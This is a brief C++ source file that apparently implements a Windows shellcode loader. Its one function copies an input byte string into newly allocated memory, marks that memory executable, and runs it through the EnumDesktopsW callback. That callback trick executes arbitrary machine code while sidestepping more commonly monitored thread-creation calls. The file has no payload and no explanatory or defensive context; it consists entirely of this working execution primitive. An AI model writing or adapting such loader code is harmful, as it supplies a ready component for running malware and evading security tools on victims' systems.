#include "pch.h"


BOOL exec(std::string input) {

	std::vector<uint8_t> myVector(input.begin(), input.end());
	
	LPVOID address = ::VirtualAlloc(NULL, myVector.size(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memcpy(address, &myVector[0], myVector.size());

	DWORD dummy;
	::VirtualProtect(address, myVector.size(), PAGE_EXECUTE_READ, &dummy);

	::EnumDesktopsW(::GetProcessWindowStation(), (DESKTOPENUMPROCW)address, NULL);

	return TRUE;
}